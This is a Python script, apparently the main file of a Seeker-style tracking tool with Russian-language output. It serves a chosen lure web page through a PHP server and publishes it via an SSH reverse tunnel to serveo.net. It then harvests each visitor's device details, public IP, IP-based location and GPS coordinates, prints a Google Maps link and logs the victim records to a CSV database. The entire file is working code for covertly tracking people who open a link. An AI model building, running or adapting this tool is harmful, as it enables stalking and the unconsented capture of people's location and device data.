# -*- coding: utf-8 -*-
#by bafomet
R = '\033[31m'   # Red
G = '\033[1;34m' # Blue
C = '\033[1;32m' # Green
W = '\033[0m'    # white
O = '\033[45m'   # Purple

from shutil import which

pkgs = ['python3', 'pip3', 'php', 'ssh']
inst = True
for pkg in pkgs:
	present = which(pkg)
	if present == None:
		print(R + '[-] ' + W + pkg + C + ' is not Installed!')
		inst = False
	else:
		pass
if inst == False:
	exit()
else:
	pass

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''
version = 'beta 5.0 '
os.system('clear')
print(G + ' [ + ]' + C + ' Запуск приложения... \n' + W)
print(" 0.5 alfa  1.0 beta  2.0 beta  3.0 Релиз  5.0 ✓  8.0")
os.system("cd template;python2 banner.py")


def ver_check():
	print('\n' + R + ' [ + ]' + C + ' Бесплатная премиум версия: \n' + W + ' \n https://t.me/osint_san_framework')

def tunnel_select():
	if tunnel_mode == None:
		serveo()
	elif tunnel_mode == 'manual':
		print(G + '' + C + '' + W + '\n')
	else:
		print(R + '[ + ]' + C + ' Недействительный выбранный режим туннеля, Проверьте Serveo или Ngrok.  [-h, --help]' + W + '\n')
		exit()

def template_select():
	global site, info, result
	print(G + ' [ + ]' + C + ' Выберите сайт для запуска: ' + W + '\n')
	
	with open('template/templates.json', 'r') as templ:
		templ_info = templ.read()
	
	templ_json = json.loads(templ_info)
	
	for item in templ_json['templates']:
		name = item['name']
		print(G + ' [ {} ]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
	print()
	selected = int(input(R + ' [Введите номер] ' + W))
	print("")
	
	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
		sys.exit()
	
	print('\n' + G + '[+]' + C + ' Загрузка {} Ожидайте...'.format(templ_json['templates'][selected]['name']) + W)
	
	module = templ_json['templates'][selected]['module']
	if module == True:
		imp_file = templ_json['templates'][selected]['import_file']
		import importlib
		importlib.import_module('template.{}'.format(imp_file))
	else:
		pass

	info = 'template/{}/php/info.txt'.format(site)
	result = 'template/{}/php/result.txt'.format(site)

def serveo():
	global subdom
	flag = False

	print(G + '[+]' + C + ' Проверка Serveo, Статус...', end='')

	try:
		time.sleep(1)
		rqst = requests.get('https://serveo.net', timeout=5)
		sc = rqst.status_code
		if sc == 200:
			print(C + '[' + G + ' Онлайн ' + C + ']' + W + '\n')
		else:
			print(C + '[' + R + 'Статус : {}'.format(sc) + C + ']' + W + '\n')
			exit()
	except requests.ConnectionError:
		print(C + '[' + R + ' Офлайн, отвал нахуй. Запускай через : python3 bigbro.py -t manual -k start ' + C + ']' + W + '\n')
		exit()
			
	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
	if subdom is None:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	
	while True:
		with open('logs/serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print(e)
				pass
		time.sleep(2)

def server():
	print('\n' + G + '[ + ]' + C + ' Порт : '+ W + str(port))
	print('\n' + G + '[ + ]' + C + ' Запуск PHP Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Успешно ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Да ебаный рот ' + C + ']' + W)
		Quit()

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[ + ]' + R + ' Ожидайте, получение данных...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global info, result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:

				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print(G + '[+]' + C + ' Информация о устройстве : ' + R + '\n')
				print(G + '[+]' + C + ' OS         : ' + W + var_os)
				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)
			

				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code

				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])

					row.append(var_continent)
					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)

					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
					print(G + '[+]' + C + ' Country    : ' + W + var_country)
					print(G + '[+]' + C + ' Region     : ' + W + var_region)
					print(G + '[+]' + C + ' City       : ' + W + var_city)
					print(G + '[+]' + C + ' Org        : ' + W + var_org)
					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
					print(G + '[+]' + C + ' Блять он нищеброд. Ну и железо ' + R + '\n')
	except ValueError:
		pass
	
	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Не распознано'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Не распознаноe'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Не распознано'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n' + G + '[+]' + C + ' Информация о обьекте : ' + R + '\n')
				print (G + '[+]' + C + ' Широта  : ' + W + var_lat)
				print (G + '[+]' + C + ' Долгота : ' + W + var_lon)
				print (G + '[+]' + C + ' Точность  : ' + W + var_acc)
				print (G + '[+]' + C + ' Высота  : ' + W + var_alt)
				print (G + '[+]' + C + ' Дистанция : ' + W + var_dir)
				print (G + '[+]' + C + ' Скорость    : ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + G + '[+]' + C + ' Google карты.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	
	if kml_fname is not None:
		kmlout(var_lat, var_lon)

	csvout()
	repeat()

def kmlout(var_lat, var_lon):
	with open('template/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(G + '[+]' + C + ' Генерируруем файл KML..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))

def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(row)
	print(G + '[+]' + C + ' Новая запись добавлена в базу данных.: ' + W + os.getcwd() + '/db/results.csv')

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	ver_check()
	tunnel_select()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + ' Хули ты не туда жмешь, на  ошибку' + R)
	Quit()
